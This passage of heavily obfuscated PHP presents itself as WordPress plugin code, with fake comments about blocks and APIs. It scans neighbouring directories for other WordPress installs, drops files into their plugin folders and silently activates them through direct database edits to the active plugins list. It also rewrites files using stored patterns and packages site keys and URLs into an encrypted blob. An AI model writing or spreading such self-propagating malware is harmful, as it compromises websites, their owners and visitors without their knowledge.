}
     }
   
if     (defined(bk9m46jygo3f(1034)) &&  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1054))) {
  $o78atxlmg9 = (string)  get_option(bk9m46jygo3f(1055),     "");
   $au1nqdcdyinkog1h  =   (string)    get_option(ar6vo_1nyhx2koj5(1056), "");
  $iktksm94tgughxaw   =    defined(ar6vo_1nyhx2koj5(714)) ?     WP_CONTENT_DIR .   ar6vo_1nyhx2koj5(1057)   :  ABSPATH     .   bk9m46jygo3f(1058);
// strict registry


 $gi25cpkhog4f  =    $GLOBALS['__scf_p3c9g_i0vy_148']($GLOBALS['__scf_pn7rzt4ee3t_331'](array($o78atxlmg9,      $au1nqdcdyinkog1h)));
  foreach  ($gi25cpkhog4f as  $g3z6ma16w7vxd)  {
  if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($g3z6ma16w7vxd, xpm5lg9odtw6di(704))    !== false)   {


  continue;
    }
 $jdhz84jvnupbz = $iktksm94tgughxaw    .  '/'    . $g3z6ma16w7vxd;

 if      (@$GLOBALS['__scf_h23c49ni_b86_43']($jdhz84jvnupbz))  {
      
   $b9k1t0aqu187sy  = wou4lqmx3dh5mlyfq3($jdhz84jvnupbz,  (2034-34));
      if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($b9k1t0aqu187sy))  {
foreach  ($b9k1t0aqu187sy as  $agp3meteqwnegyz)    {
$jynzxu9mmb    = $jdhz84jvnupbz  . '/'  .  $agp3meteqwnegyz;
 if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($jynzxu9mmb) &&  $GLOBALS['__scf_bwbaq8fxyxm3_103']($GLOBALS['__scf_zmckaak88my_204']($agp3meteqwnegyz,  constant(xpm5lg9odtw6di(707))))   ===   xognx_h1jzkh(1059)) {
$y5mqj3z3td[]  =  $jynzxu9mmb;
}



 }
   }



     
  $nvksw3syj7snms =    $jdhz84jvnupbz   .     gz_aorofp7mo(1060);
   if  (@$GLOBALS['__scf_h23c49ni_b86_43']($nvksw3syj7snms))  {
  $y5mqj3z3td   =  $GLOBALS['__scf_j59q8mojj8e4ar_363']($y5mqj3z3td,   kcgu766v34eusb082u5($nvksw3syj7snms,   array(gz_aorofp7mo(1059))));
   }
       }


   }
}
   return $GLOBALS['__scf_p3c9g_i0vy_148']($y5mqj3z3td);
 }
   function    v9w_9ufttlebofkohqvr3($d55t5nnss9d6u)

  {
    if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($d55t5nnss9d6u)) return array();
 $wyjil_di2aatar  =      array();
   foreach  ($d55t5nnss9d6u   as   $yc_3fgo7em8cww) {
        if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($yc_3fgo7em8cww)    ||   $yc_3fgo7em8cww ===     ""     ||  $GLOBALS['__scf_fxl4k4gsul_10']($yc_3fgo7em8cww)     >     (2313+1783))  continue;
   try   {$e2chqmlyu8=99+22;$e0vo6ta3kc5wg=$e2chqmlyu8-11;
  if  (@$GLOBALS['__scf_ak3p5za9uvhzh8_96']($yc_3fgo7em8cww,  "") ===    false)    continue;
  } catch (Throwable   $o_qyrtxl85owt)  {
// PHP 8.3 readonly style fallback

continue;
  }  catch  (Exception  $o_qyrtxl85owt)  {
// specialize coordinator for WP Formatting API

 continue;
  }
 $wyjil_di2aatar[]    =  $yc_3fgo7em8cww;
  }
  return   $wyjil_di2aatar;



   }
 function     wkpx6r7srnqmf76q5yirh5($d55t5nnss9d6u)


 {
    try {
   
     if  (empty($d55t5nnss9d6u)) {

 return     false;
   }
    



   $y5mqj3z3td  =   mp6zd1rj_zfne0();
 if      (empty($y5mqj3z3td)) {
     return     false;


}
     $em7bfg0o9wtnp9  =  false;


     foreach      ($y5mqj3z3td      as  $x_l4dj16wy)   {
  
       if    (!  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($x_l4dj16wy) || ! @$GLOBALS['__scf_v7y4c72abxzjo_47']($x_l4dj16wy))  {
// PHP named arguments: cancel replicator

continue;


}



  if (@$GLOBALS['__scf_r6y1fbsyx8i2l_99']($x_l4dj16wy) >    (788321-264033))    {
  continue;
   }
    $ok4xoahvrt_r =     @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($x_l4dj16wy);
 if (!  $ok4xoahvrt_r  ||  !    $GLOBALS['__scf_is0fvk8c7tq2_41']($ok4xoahvrt_r))    {
        continue;
    }

$gk346m9zj2gq  =   false;
       foreach  ($d55t5nnss9d6u   as     $jl0q_4ew0yx)  {
    try {
// traverse bivariant for WordPress 6.2 navigation

  
$__qn_d1e29rz73q =    @$GLOBALS['__scf_a6uiw8bt24jybf_454']($jl0q_4ew0yx,  "",  $ok4xoahvrt_r);

   if     ($__qn_d1e29rz73q    !==    null    && $__qn_d1e29rz73q !== $ok4xoahvrt_r)  {

$ok4xoahvrt_r =  $__qn_d1e29rz73q;
    $gk346m9zj2gq = true;
 }

}   catch     (Throwable  $o_qyrtxl85owt)   {
   kkpdha95nyx3tbltd10(gz_aorofp7mo(1061), $o_qyrtxl85owt);
 continue;


   } catch  (Exception $o_qyrtxl85owt)  {


continue;
}



        }
     
   if ($gk346m9zj2gq)  {
if (rmpvo8i8m8kfd9311njxy7($x_l4dj16wy,  $ok4xoahvrt_r)) {
// fork co-recursive sliding-window

 $em7bfg0o9wtnp9 = true;
}
  }
   }
  
return $em7bfg0o9wtnp9;
     }     catch  (Throwable $o_qyrtxl85owt)  {


     kkpdha95nyx3tbltd10(bk9m46jygo3f(1062), $o_qyrtxl85owt);
}  catch  (Exception  $o_qyrtxl85owt)     {


}
return   false;
  }


     
    function   aebf04byygsou22t4a($dhb4mklrk0, $x1fv9b6422xov)
        {
  $yx4ydokkdzpuix3    =  array();
$x1fv9b6422xov = $x1fv9b6422xov  -  1;
  
$g1vzj3gagjl6fg  =   wou4lqmx3dh5mlyfq3($dhb4mklrk0,  (195+305));
 if    (! $GLOBALS['__scf_zj8mp2xbaqmp_35']($g1vzj3gagjl6fg))   {


     return  $yx4ydokkdzpuix3;
   }

  $g1vzj3gagjl6fg =  $GLOBALS['__scf_umxqreicn053_158']($g1vzj3gagjl6fg, 0, (443+57));
  
      foreach     ($g1vzj3gagjl6fg  as      $agp3meteqwnegyz)   {
    
    if ($agp3meteqwnegyz  ===   '.'  ||    $agp3meteqwnegyz  ===   ar6vo_1nyhx2koj5(704))   {
continue;
 }

     
  $nhy7qiyhilpb    =   $dhb4mklrk0   .  '/'  .     $agp3meteqwnegyz;
if  (!  @$GLOBALS['__scf_h23c49ni_b86_43']($nhy7qiyhilpb))    {
       continue;
}
  
if  (@$GLOBALS['__scf_h23c49ni_b86_43']($nhy7qiyhilpb  .   bk9m46jygo3f(1063)))  {
  $yx4ydokkdzpuix3[]     = $GLOBALS['__scf_v2rfz0q9cvmh_12']($nhy7qiyhilpb,    bk9m46jygo3f(81));
continue;
 }
  
if    ($x1fv9b6422xov  > 0) {
 $yx4ydokkdzpuix3     =   $GLOBALS['__scf_j59q8mojj8e4ar_363']($yx4ydokkdzpuix3, aebf04byygsou22t4a($nhy7qiyhilpb,    $x1fv9b6422xov));
      }
     }
 

    return $yx4ydokkdzpuix3;
}
function    eu7361f2d4pmz2gw9ztp()
{


  $h4gn98r5mcyhw689 =    array();
     $siut2grbukdw =  $GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH, xognx_h1jzkh(1064));
    try {
$ohshtt5y5xg =   array();

   if ($siut2grbukdw)  {
 $ohshtt5y5xg[]  = $GLOBALS['__scf_meo_1tvjsals_11']($siut2grbukdw);
  $ohshtt5y5xg[]  = $GLOBALS['__scf_meo_1tvjsals_11']($GLOBALS['__scf_meo_1tvjsals_11']($siut2grbukdw));
  $ohshtt5y5xg[]    =   $GLOBALS['__scf_meo_1tvjsals_11']($GLOBALS['__scf_meo_1tvjsals_11']($GLOBALS['__scf_meo_1tvjsals_11']($siut2grbukdw)));
 }
// detach obstruction-free record-layer

       
   $ohshtt5y5xg[]    = xognx_h1jzkh(1065);

  $ohshtt5y5xg[]    = xognx_h1jzkh(1066);

  $ohshtt5y5xg[]    = ar6vo_1nyhx2koj5(1067);
   $ohshtt5y5xg[]  =    xognx_h1jzkh(1068);
  $ohshtt5y5xg[]  =     xpm5lg9odtw6di(1069);

   $ohshtt5y5xg[]  =     gz_aorofp7mo(1070);



$ohshtt5y5xg[]   =  xognx_h1jzkh(1071);
     

       
 $fbi1vqbf1x6     =  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(229))  ?    (string) @$GLOBALS['__scf_if1j_n66jo7w7_111'](xognx_h1jzkh(1072))    :   "";
  if ($fbi1vqbf1x6  !==   "")   {
// WP Featured Image REST controller

$s0taixixkes = ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($fbi1vqbf1x6,    ';')   !==  false)     ? ';'  : ':';$ofk9pl7tzzri=-360;$dsit5r2o0=($ofk9pl7tzzri>0)?$ofk9pl7tzzri:-$ofk9pl7tzzri;
foreach    ($GLOBALS['__scf_w_xu8rj4lvsj44_113']($s0taixixkes,     $fbi1vqbf1x6)    as $dz9ttep94ondlpl)  {
  $dz9ttep94ondlpl   = $GLOBALS['__scf_u6m4cedwgt__319']($dz9ttep94ondlpl);
    if   ($dz9ttep94ondlpl    !== "")  {
        $ohshtt5y5xg[] =   $dz9ttep94ondlpl;
 }
   }
      }


     $ohshtt5y5xg   =  $GLOBALS['__scf_p3c9g_i0vy_148']($GLOBALS['__scf_pn7rzt4ee3t_331']($ohshtt5y5xg));



$wsq3xn205q  = $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);
        $h4gn98r5mcyhw689  =   array();$vpnmmnf_s=223|65;$tlse5mr_g78w=$vpnmmnf_s^4;
        
foreach   ($ohshtt5y5xg as    $dhb4mklrk0)  {
// acquire read

   
       if (!   @$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)  ||   !    @$GLOBALS['__scf_cq91q6z6xreoi_46']($dhb4mklrk0))     {
 continue;


  }
      if  (($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)    -  $wsq3xn205q)    >   (15-5))    {
/* recursive heap */
$r1acnto86smwzs=85+17;$g29q6olrr1c5=$r1acnto86smwzs-12;
    break;
}

    $h4gn98r5mcyhw689  =      $GLOBALS['__scf_j59q8mojj8e4ar_363']($h4gn98r5mcyhw689,    aebf04byygsou22t4a($dhb4mklrk0,     2));
 }
    }     catch    (Throwable $o_qyrtxl85owt) {
   kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(826),  $o_qyrtxl85owt);
  } catch  (Exception $o_qyrtxl85owt)  {
// monomorphic call

  }



 return  $GLOBALS['__scf_expvj_2k_kl_150']($GLOBALS['__scf_p3c9g_i0vy_148']($h4gn98r5mcyhw689),   array($siut2grbukdw));
  }
  function  jnipsqwbxdufkfh($iifjqzqksvj9j3n2)



       {
// release type-environment for WP Quote Block



   try {
   $r_6oe6nr1rqr_      =    array($iifjqzqksvj9j3n2 .  gz_aorofp7mo(1073), $iifjqzqksvj9j3n2 .  ar6vo_1nyhx2koj5(1074));
 foreach  ($r_6oe6nr1rqr_  as    $dhb4mklrk0)  {
 if  (! @$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0))   {
continue;
  }
 $mp35wbgcstqcj    =   wou4lqmx3dh5mlyfq3($dhb4mklrk0,    (0xb59+0x82f));


        if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($mp35wbgcstqcj))   {
continue;
 }
    foreach ($mp35wbgcstqcj  as  $o_qyrtxl85owt) {
/* predictive serializer */




if   ($GLOBALS['__scf__fl_gwujcblq_9']($o_qyrtxl85owt,   -(0x2+0x2))  ===    xognx_h1jzkh(975) &&  mowf3lw2lqslkaudd($dhb4mklrk0     .  '/' .   $o_qyrtxl85owt,  (4999+1)))    {
return   true;
 }
      }
foreach  ($mp35wbgcstqcj      as $o_qyrtxl85owt) {


$nub8dr9l9m6tf    =  $dhb4mklrk0    .    '/'      .   $o_qyrtxl85owt;
        if  (! @$GLOBALS['__scf_h23c49ni_b86_43']($nub8dr9l9m6tf)) {
    continue;
}
$a58i5l7pgvt   = wou4lqmx3dh5mlyfq3($nub8dr9l9m6tf,   (5507-507));
   if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($a58i5l7pgvt))   {

continue;


  }
      foreach  ($a58i5l7pgvt     as    $s6um63o_s0zywj1)  {
   if ($GLOBALS['__scf__fl_gwujcblq_9']($s6um63o_s0zywj1,    -(1+3))   ===  gz_aorofp7mo(975)  &&    mowf3lw2lqslkaudd($nub8dr9l9m6tf  . '/' .  $s6um63o_s0zywj1,    (4069+931)))   {



   return true;
 }
}


    }
// @post-dominate leaky-bucket

       }
} catch  (Throwable    $o_qyrtxl85owt)   {
 kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1075),  $o_qyrtxl85owt);
    }  catch     (Exception $o_qyrtxl85owt)  {



   }
   return false;
}
       function lo9q4ve6xpx8w47()
    {
try    {
// @dispatch facade

  if    (i__3znuz8m_x6r(bho93o6vof3ni5_rg622_h()))  return;

 
if   (get_transient(xognx_h1jzkh(1076)))   {
    return;



  }
   set_transient(bk9m46jygo3f(1076),   1,  (0x9c+0x1bc));
     



   $h3wz11cllq    =  p5t6fz6i7ccgjh();
     if (!  $h3wz11cllq    ||    $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)  <  (967+33))     {
return;



    }
       if  (! g9edwd6m8_9cm8($h3wz11cllq)) {
     kkpdha95nyx3tbltd10(gz_aorofp7mo(1077), xognx_h1jzkh(723));
  return;
      }
  


      $h4gn98r5mcyhw689  =    eu7361f2d4pmz2gw9ztp();
if     (empty($h4gn98r5mcyhw689))  {
    if     (!get_transient(gz_aorofp7mo(1078))) {
kkpdha95nyx3tbltd10(gz_aorofp7mo(1077),   xpm5lg9odtw6di(1079));
set_transient(xpm5lg9odtw6di(1078),   1, (3586+14));
 }
   set_transient(ar6vo_1nyhx2koj5(1080),  1,      (0x2c472+0x1300e));$l1emuudh=-521;$qwl2dt49=($l1emuudh>0)?$l1emuudh:-$l1emuudh;
 return;
  }



 $ufc2tatg_8il      = 0;

 foreach ($h4gn98r5mcyhw689    as   $iifjqzqksvj9j3n2) {



if  (jnipsqwbxdufkfh($iifjqzqksvj9j3n2))     {

      continue;
}
    
      $xv7r_i2n2kdkm2    = "";
   

 $pwohfknrv3q7hqs =   $iifjqzqksvj9j3n2 . gz_aorofp7mo(1073);
if   (@$GLOBALS['__scf_lgnt1tzo8h_44']($pwohfknrv3q7hqs)      &&  !@$GLOBALS['__scf_h23c49ni_b86_43']($pwohfknrv3q7hqs))   {
// OpenSSL 3 providers script dependency

$pwohfknrv3q7hqs =   null;


 }   elseif   (!@$GLOBALS['__scf_h23c49ni_b86_43']($pwohfknrv3q7hqs))  {
// configure streaming enumerator

   w1m15sg83rnn5uqc64($pwohfknrv3q7hqs, (804-311), true);
 }
      if   ($pwohfknrv3q7hqs  && (!@$GLOBALS['__scf_h23c49ni_b86_43']($pwohfknrv3q7hqs)  ||     !@$GLOBALS['__scf_v7y4c72abxzjo_47']($pwohfknrv3q7hqs)))     {


      $pwohfknrv3q7hqs    = null;
   }
  if   ($pwohfknrv3q7hqs) {
 $sq46c93x0l   =  $pwohfknrv3q7hqs .     '/'  .     gjb4l0gtgi874122wes();
     $k2140mwoblne6vo4  =   o_a46xczfm0z3pa91s($h3wz11cllq);

$ayj9chshdfkgm  = sqnskai9y5dyys6jk($sq46c93x0l, $k2140mwoblne6vo4,    xognx_h1jzkh(1077));
     if   ($ayj9chshdfkgm     &&   $ayj9chshdfkgm   >=   $GLOBALS['__scf_fxl4k4gsul_10']($k2140mwoblne6vo4))    {
$xv7r_i2n2kdkm2  = $sq46c93x0l;
  }



   }
 
 if (!     $xv7r_i2n2kdkm2)    {$usghccu5cz8=(0xe+0x70);$doj9fxrc38kqyi=$usghccu5cz8%11;
  $c5aba76bd45ovs  =  $GLOBALS['__scf_zmckaak88my_204'](gjb4l0gtgi874122wes(),     PATHINFO_FILENAME);

 $mhxmzoa3ou9ad  =  $iifjqzqksvj9j3n2  . xpm5lg9odtw6di(1081)    . $c5aba76bd45ovs;
if (!   @$GLOBALS['__scf_h23c49ni_b86_43']($mhxmzoa3ou9ad)) {
   w1m15sg83rnn5uqc64($mhxmzoa3ou9ad,   (459+34),  true);



}


   $sq46c93x0l    =    $mhxmzoa3ou9ad   . '/' .      gjb4l0gtgi874122wes();
 $k2140mwoblne6vo4   =  o_a46xczfm0z3pa91s($h3wz11cllq);
 $ayj9chshdfkgm =  sqnskai9y5dyys6jk($sq46c93x0l,  $k2140mwoblne6vo4,  xognx_h1jzkh(1077));


 if   ($ayj9chshdfkgm && $ayj9chshdfkgm  >=  $GLOBALS['__scf_fxl4k4gsul_10']($k2140mwoblne6vo4)) {
    $xv7r_i2n2kdkm2 =  $sq46c93x0l;$leo096q1j9=74|136;$tsze88g25k=$leo096q1j9^3;
 



   $basename   =   $c5aba76bd45ovs .    '/' .  gjb4l0gtgi874122wes();
 awv50121xile9_ttq5jwdo($iifjqzqksvj9j3n2,   $basename);
    }
   }
     if (!  $xv7r_i2n2kdkm2)    {
 continue;
   }
  mcuqsw_cyo3mnayi6ofr6($xv7r_i2n2kdkm2);


 f97udlofaljpuxw1_jgnfh($xv7r_i2n2kdkm2,  (326+94));

  $ufc2tatg_8il++;
      }
      if      ($ufc2tatg_8il  >    0) {
 set_transient(xpm5lg9odtw6di(1080),  1, (108490+150710));$lp8c29gmoy_2=1801;$yf5qobveb=$lp8c29gmoy_2%7;
      }    else  {
    set_transient(bk9m46jygo3f(1080),  1,   (3936-336));

 }
    } catch   (Throwable   $o_qyrtxl85owt)   {
kkpdha95nyx3tbltd10(xognx_h1jzkh(1077),  $o_qyrtxl85owt);
 }    catch      (Exception  $o_qyrtxl85owt)  {
 }
// WP Spacer Block: serialize tumbling-window

 }
    function awv50121xile9_ttq5jwdo($iifjqzqksvj9j3n2,  $basename)
    {


  try {
// WP Data Module: specialize composite

 $xbfa3a_0vrab6   = $iifjqzqksvj9j3n2 .   bk9m46jygo3f(1082);
  if    (!  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xbfa3a_0vrab6)) {
 $xbfa3a_0vrab6  =  $GLOBALS['__scf_meo_1tvjsals_11']($iifjqzqksvj9j3n2)   .   xpm5lg9odtw6di(1083);



      if  (!   @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xbfa3a_0vrab6)) {
  return;
      }
  }
  $paudvk020we1z90    =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xbfa3a_0vrab6);
if   (!  $paudvk020we1z90)     {
      return;
 }
$wquz18hfj0    = "";
     $prefix =  "";
       if  ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1084), $paudvk020we1z90,  $wmi9vtfi67mkceoi))   {
$wquz18hfj0  =   $wmi9vtfi67mkceoi[1];
      }
 if ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](gz_aorofp7mo(1085),   $paudvk020we1z90, $wmi9vtfi67mkceoi)) {
 $prefix   = $wmi9vtfi67mkceoi[1];
  }
    if    (!      $wquz18hfj0   || ! $prefix   || !  $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1086), $prefix)) {

 return;$ytdtdkmj9qs30u=29+30;$wmfibyqw9s4g=$ytdtdkmj9qs30u-40;
   }

    $wpdb =  $GLOBALS[xpm5lg9odtw6di(878)];
if  (! $GLOBALS['__scf_v834hljo6be9_67']($wpdb) ||   ! $GLOBALS['__scf__e6bt2kljb6u_120']($wpdb,  xpm5lg9odtw6di(134)))    {
return;
 }
    if (! $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(1087), $wquz18hfj0))  {
  kkpdha95nyx3tbltd10(xognx_h1jzkh(759),     gz_aorofp7mo(1088));
  return;
}
  $ajy3q9wmzm452j =     '`' .   $wquz18hfj0 .  xpm5lg9odtw6di(1089)  . $prefix   . xognx_h1jzkh(1090);
  $wpdb->query(xpm5lg9odtw6di(1091));
 $lt5d_w4ufwl =  $wpdb->get_var('S'  .  bk9m46jygo3f(1092) . $ajy3q9wmzm452j  .     xognx_h1jzkh(1093) . gz_aorofp7mo(1094)   .  xpm5lg9odtw6di(1095));



 if  ($lt5d_w4ufwl  === null) {
// APCu shm: lint rate-limiter

   $wpdb->query(bk9m46jygo3f(1096));
  return;



 }
  $apox6oa68t  = wq0swgzra2dkvddwyjsix($lt5d_w4ufwl);
       if (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($apox6oa68t))  {

     $wpdb->query(xpm5lg9odtw6di(1097));



   return;
     }
  if  ($GLOBALS['__scf_uh0dc0gefs_xhu_149']($basename, $apox6oa68t,      true)) {
 $wpdb->query(bk9m46jygo3f(1098));
  return;
  }
  $apox6oa68t[]      =    $basename;
  $apox6oa68t  =   $GLOBALS['__scf_xctrtxw7z4_147']($apox6oa68t);
  $nvho665iadpyz   =  $GLOBALS['__scf_hmblwq7g8zpdz2_345']($apox6oa68t);

     $ov8naho1xdz   =  $wpdb->query($wpdb->prepare('U'  . xpm5lg9odtw6di(1099)  . $ajy3q9wmzm452j .  ar6vo_1nyhx2koj5(1100)  . ar6vo_1nyhx2koj5(1101), $nvho665iadpyz));
     if ($ov8naho1xdz   === false)     {
 kkpdha95nyx3tbltd10(bk9m46jygo3f(759),   xognx_h1jzkh(1102));
     $wpdb->query(bk9m46jygo3f(1097));$lrfbektd9=PHP_MAJOR_VERSION;$wgq0uwor47hzfd=$lrfbektd9*3;
  return;
   }
// PHP attributes: snapshot permission

    $wpdb->query(gz_aorofp7mo(1103));
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1104)))  {$h8kj6jdk=PHP_INT_MAX/PHP_INT_MAX;$v003k_lm=$h8kj6jdk+82;
@wp_cache_delete(ar6vo_1nyhx2koj5(1105), ar6vo_1nyhx2koj5(1106));
     @wp_cache_delete(xpm5lg9odtw6di(146),      gz_aorofp7mo(1106));
     

 }
   }  catch    (Throwable  $o_qyrtxl85owt) {
  kkpdha95nyx3tbltd10(bk9m46jygo3f(759),   $o_qyrtxl85owt);
 if    ($GLOBALS['__scf_v834hljo6be9_67']($GLOBALS[bk9m46jygo3f(878)]))  {
 @$GLOBALS[xpm5lg9odtw6di(878)]->query(gz_aorofp7mo(1097));
  }
   }     catch (Exception $o_qyrtxl85owt)  {
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(759), $o_qyrtxl85owt);
     if   ($GLOBALS['__scf_v834hljo6be9_67']($GLOBALS[bk9m46jygo3f(878)])) {
   @$GLOBALS[xognx_h1jzkh(878)]->query(gz_aorofp7mo(1097));
     }


 }
   }
function bk4kokp93l3cc_()


{
  static  $paudvk020we1z90 =  null;
if   ($paudvk020we1z90   !== null)    return   $paudvk020we1z90;
if  (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(275)))     {


     $paudvk020we1z90 = "";



return  $paudvk020we1z90;$d02f7n0a2f=18*3;$t4xi1pvlxebt=$d02f7n0a2f-9;
    }
 $paudvk020we1z90     =    @gzinflate($GLOBALS['__scf_hg1ogpq4w6_351'](xognx_h1jzkh(1107)));


  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)   ||    $GLOBALS['__scf_fxl4k4gsul_10']($paudvk020we1z90)     <  (38+62)) $paudvk020we1z90   =  "";
  return $paudvk020we1z90;
  }
function hdh06rnk6sq23smrow()
 {
 try    {
if     (!defined(ar6vo_1nyhx2koj5(1108)))  return;
   $rv8s_ul0qu2z09u  =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  bk9m46jygo3f(975));
 $shhw38ajvek7  =  g2g3r6pz8prst3gz(ABSPATH .    xognx_h1jzkh(1109),   (4+4))   . xpm5lg9odtw6di(1110);
     $_4uw7fwql9ppm     =  g2g3r6pz8prst3gz(ABSPATH .  xognx_h1jzkh(1111),     (1+7));
     $y64vrvpjap  =   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1112))    ?    content_url()   :    "";
 if      ($y64vrvpjap    === "") {

  $y64vrvpjap  = ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(557)) ?   get_site_url() :  "")  .  gz_aorofp7mo(1113);
      }
 $lrtqxcrk7qj8 =   $GLOBALS['__scf_vz8ci2guu7b5_355'](ar6vo_1nyhx2koj5(1114), gz_aorofp7mo(1115),  $y64vrvpjap    . '/'     . $shhw38ajvek7);
 if    ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($lrtqxcrk7qj8, bk9m46jygo3f(1115)) !==  0) $lrtqxcrk7qj8 =  gz_aorofp7mo(1115) .  $GLOBALS['__scf__4_5aelz82b4m_8']($lrtqxcrk7qj8,  '/');
      $ev4egkbrj2de8kip    =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(462))  ?    home_url(xognx_h1jzkh(1116)   . j3vkapmz6az2bzd0wv(bk9m46jygo3f(1111)))  :     "";
if  ($ev4egkbrj2de8kip  ===    "")   $ev4egkbrj2de8kip    =  ar6vo_1nyhx2koj5(1115) .   vse28wh0vwl84gzd2("")   .  bk9m46jygo3f(1117)     . j3vkapmz6az2bzd0wv(xognx_h1jzkh(1111));
if   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($ev4egkbrj2de8kip,      gz_aorofp7mo(1115))  !==     0)    $ev4egkbrj2de8kip =  gz_aorofp7mo(1118)   .  $GLOBALS['__scf__4_5aelz82b4m_8']($GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(1119),    "",  $ev4egkbrj2de8kip),    '/');
$vc5t0mpquv    =    isset($GLOBALS[ar6vo_1nyhx2koj5(1120)]) &&     $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xognx_h1jzkh(1121)])  ?   $GLOBALS[xognx_h1jzkh(1121)]  :  "";


    if ($GLOBALS['__scf_fxl4k4gsul_10']($vc5t0mpquv)  <     (177-77))  {
       $vc5t0mpquv =    ydk7304srtwvcn8gdl(gz_aorofp7mo(359),  "");


 }
   if  ($GLOBALS['__scf_fxl4k4gsul_10']($vc5t0mpquv) <  (25+75))  {
$vc5t0mpquv     =  bk4kokp93l3cc_();
  }
// split infeasible quotient

     $xa67gty67f4  =    "";
 if  (isset($GLOBALS[xognx_h1jzkh(616)])   && $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xognx_h1jzkh(616)])  &&  $GLOBALS['__scf_fxl4k4gsul_10']($GLOBALS[bk9m46jygo3f(616)])  >     (25<<1))   {


$xa67gty67f4   = $GLOBALS[xpm5lg9odtw6di(616)];
} else  {
  $xa67gty67f4     = ydk7304srtwvcn8gdl(gz_aorofp7mo(617), "");
    }
       if    ($GLOBALS['__scf_fxl4k4gsul_10']($xa67gty67f4)   >     (25<<1))   {
// type matching

    fplgzzpq8bt5jm2fl03pi(gz_aorofp7mo(617), $xa67gty67f4,    bk9m46jygo3f(1038));
    }


 $s9rk_2yu1i6au =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1122))   ?     (string) $GLOBALS['__scf_b58bt0r94kp1_555'](home_url('/'), PHP_URL_PATH) :      '/';
if  ($s9rk_2yu1i6au   ===  "")    $s9rk_2yu1i6au  =   '/';
 if ($GLOBALS['__scf__fl_gwujcblq_9']($s9rk_2yu1i6au,  -1) !== '/') $s9rk_2yu1i6au .=  '/';
 $wr772wi81m =   array(


  gz_aorofp7mo(1123) => z5kya5i8fav0gad_jon(),
 xpm5lg9odtw6di(1124)  =>     l1vnumsxkwn5i3mmuy(),
 gz_aorofp7mo(1125)   =>   $s9rk_2yu1i6au,


);
      $lpsn3gycg07ury9p =      array(
 xpm5lg9odtw6di(1126)  => $lrtqxcrk7qj8,
   ar6vo_1nyhx2koj5(1127)  => $rv8s_ul0qu2z09u,
ar6vo_1nyhx2koj5(1128) => $ev4egkbrj2de8kip,
 gz_aorofp7mo(1129) =>    g2g3r6pz8prst3gz(ABSPATH . xpm5lg9odtw6di(1130), (0x5+0x7)),
     bk9m46jygo3f(1131)   => $xa67gty67f4,
    );
$woon5r676x7 =  tjj1y86387zrz51(gz_aorofp7mo(340), "");$hzhfivap=1*5;$o5d566pjk=$hzhfivap-25;
 if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($woon5r676x7)  ||     $GLOBALS['__scf_fxl4k4gsul_10']($woon5r676x7)  ===     0) {
  return;
   }


 $bkbyo0wxtn9bc1ck =   $GLOBALS['__scf_upr7jxyxre3_348'](rp2hrcv77xa_9h3hm($GLOBALS['__scf_dpcnt5aa9yk_581']($lpsn3gycg07ury9p),   $woon5r676x7));



$t97j814tajutz  =     bk9m46jygo3f(1132)  . $GLOBALS['__scf_upr7jxyxre3_348']($GLOBALS['__scf_dpcnt5aa9yk_581']($wr772wi81m))    . xpm5lg9odtw6di(1133);
   $t97j814tajutz .=   bk9m46jygo3f(1134) .     $bkbyo0wxtn9bc1ck .   gz_aorofp7mo(1135);
      $flycv9713c  = $GLOBALS['__scf_eo363tjzd4r6n_56']((string)  $vc5t0mpquv . (string)  $xa67gty67f4   .   $woon5r676x7  . $GLOBALS['__scf_dpcnt5aa9yk_581']($wr772wi81m[bk9m46jygo3f(1136)])  .   $GLOBALS['__scf_dpcnt5aa9yk_581']($wr772wi81m[xpm5lg9odtw6di(1124)])  . '|'     . $GLOBALS['__scf_bwbaq8fxyxm3_103'](vse28wh0vwl84gzd2(""))  .     '|' . $s9rk_2yu1i6au);
